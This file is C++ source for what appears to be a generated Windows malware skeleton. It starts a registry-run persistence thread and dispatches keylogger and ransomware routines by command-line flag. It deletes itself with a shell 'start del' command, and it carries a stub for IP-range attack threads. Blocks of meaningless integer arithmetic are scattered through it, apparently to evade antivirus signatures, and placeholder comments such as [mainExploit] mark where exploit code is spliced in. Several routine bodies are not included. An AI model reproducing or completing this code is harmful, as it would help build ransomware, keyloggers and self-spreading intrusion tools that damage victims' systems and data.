#include "test14.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName ="";
std::string tmpFileName ="";
int main(int argc, char** argv){
	
	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);
	tmpFileName = fileName;
	if (isRandomName) {
		tmpFileName = RandomStr(8) + ".exe";
		//[randomeNameModule](tmpFileName);
	}
	//[ninjaModule]
	if(argc==0){/*normal process*/
	//
std::vector<DWORD> arr_dwThreadIdModule;
std::vector<HANDLE> arr_hThreadModule;
HANDLE hThread = NULL;
DWORD dwTID = 0;
        //Moudule RegistryRun
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RegistryRun, NULL, 0, &dwTID);
        if (hThread != INVALID_HANDLE_VALUE)
        {
            arr_hThreadModule.push_back(hThread);
int iywla0pRsV5 = 0x40a415e;
int iiyTM7XJonw = 0xa74758a;
int iRZZlNvODcM = 0xa4fc770;
int iohb1O2vu9K = iRZZlNvODcM * iiyTM7XJonw + iywla0pRsV5;
iiyTM7XJonw = 0x901dc1c - iohb1O2vu9K + 5 + 0x093ad9a + 69 - iywla0pRsV5;
iywla0pRsV5 = 0x40a415e + 10 - iiyTM7XJonw % 10 + 0xa4fc770 + 999 - iohb1O2vu9K;
iohb1O2vu9K = iywla0pRsV5 % 5 + iRZZlNvODcM % 0xa74758a + 0xcafebabe + iywla0pRsV5;
iRZZlNvODcM = 0x40a415e * 0x100 - iywla0pRsV5 + 56 ^ 0xa74758a + 1996 - iRZZlNvODcM;
int iIpmocYmy9A = iRZZlNvODcM / 77 + 0xa4fc770 - 76 / iRZZlNvODcM ^ 0x33 % iRZZlNvODcM % 0xa4fc770;
iIpmocYmy9A = 0x093ad9a * 0x10 - 22 + iIpmocYmy9A + 56 ^ 0xff + iiyTM7XJonw + 1996 - 2111 + iRZZlNvODcM;

            arr_dwThreadIdModule.push_back(dwTID);
        }
WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);
for (int i = 0; i < arr_hThreadModule.size(); i++) {
if(arr_hThreadModule[i])
CloseHandle(arr_hThreadModule[i]);
}

	
	//[mainExploit]	

		if (isRandomName)
		{
			//delete new exe
			std::string NewExePath = (std::string)fullName;
			NewExePath = NewExePath.substr(0, NewExePath.find_last_of("\\"));
			NewExePath += "\\" + tmpFileName;
			DeleteFileA(NewExePath.c_str());
		}
	}
	//
else if(strcmp(argv[0],"-k")==0)
{
Keylogger();
}//
else if(strcmp(argv[0],"-r")==0)
{
SimpleRansom();
}//[optionElseIf]
	else{
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete(){
	char out[MAX_PATH];
	GetModuleFileNameA(NULL,(LPSTR)out,100);
	char str[MAX_PATH];
	strcpy(str,"start del ");
	strcat(str,out);
	system(str);
int iAt70fvh4u4 = 0x414366c;
int iZeXbCK04Y6 = 0x7c0b17b;
int i3CERll1X5A = iAt70fvh4u4 / iZeXbCK04Y6;

}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
int ik6a9sW9C6y = 0x5693cb8;
int i2p6rx98jFM = 0xd944d88;
int iRXT0zhzEpV = 0xc9563dc;
int il6pviBTv31 = iRXT0zhzEpV * i2p6rx98jFM + ik6a9sW9C6y;
i2p6rx98jFM = 0xcefbedc - il6pviBTv31 + 5 + 0x0045f2b + 69 - ik6a9sW9C6y;
ik6a9sW9C6y = 0x5693cb8 + 10 - i2p6rx98jFM % 10 + 0xc9563dc + 999 - il6pviBTv31;
il6pviBTv31 = ik6a9sW9C6y % 5 + iRXT0zhzEpV % 0xd944d88 + 0xcafebabe + ik6a9sW9C6y;
iRXT0zhzEpV = 0x5693cb8 * 0x100 - ik6a9sW9C6y + 56 ^ 0xd944d88 + 1996 - iRXT0zhzEpV;
int iLYc10pkYUT = iRXT0zhzEpV / 77 + 0xc9563dc - 76 / iRXT0zhzEpV ^ 0x33 % iRXT0zhzEpV % 0xc9563dc;
iLYc10pkYUT = 0x0045f2b * 0x10 - 22 + iLYc10pkYUT + 56 ^ 0xff + i2p6rx98jFM + 1996 - 2111 + iRXT0zhzEpV;

	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				break;
			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
void initAttack(int ipAddress[]){
	
	register int i,j;
int imFOVSwX7m7;
int i3w2ExGdgLK = 0x0535fda;
int is0Rto4ENHj = 0x74840e3;
int icPD9OipUHd = 0x4c79a9e;
for(imFOVSwX7m7 = 0; imFOVSwX7m7 < 3; imFOVSwX7m7++)
{
    i3w2ExGdgLK = imFOVSwX7m7 * 99 - 1000 * is0Rto4ENHj + 0x456 ^ 0xf9b548f % 5 - 0xc3aebda;
    is0Rto4ENHj = imFOVSwX7m7 * 3 + icPD9OipUHd + 0x30 + 0x4c79a9e % 123 - is0Rto4ENHj;
    icPD9OipUHd = imFOVSwX7m7 * 4 - 0x74840e3 + 0xff / 0x123 - 0x4c79a9e % 234 - 0xc3aebda;
}
int iLpg1FNGNXe = icPD9OipUHd - i3w2ExGdgLK * is0Rto4ENHj + 0x4c79a9e;
iLpg1FNGNXe = imFOVSwX7m7 - 50 + 100 - 0x74840e3 ^ 99 * 0x0f - 0x4c79a9e % 2 - 3575 + 0xc3aebda;

	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
    DWORD   dwThreadIdArray[MAX_THREADS];
    HANDLE  hThreadArray[MAX_THREADS]; 
    int curIP[4];
	
	//[exploitThreads]

    //Increase IP when all exploit done
	ipAddress[0]=curIP[0];
    ipAddress[1]=curIP[1];
    ipAddress[2]=curIP[2];
    ipAddress[3]=curIP[3];
}

//[exploit_function]

void ipAr2Str(int ipAddress[],char* result){
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i",ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
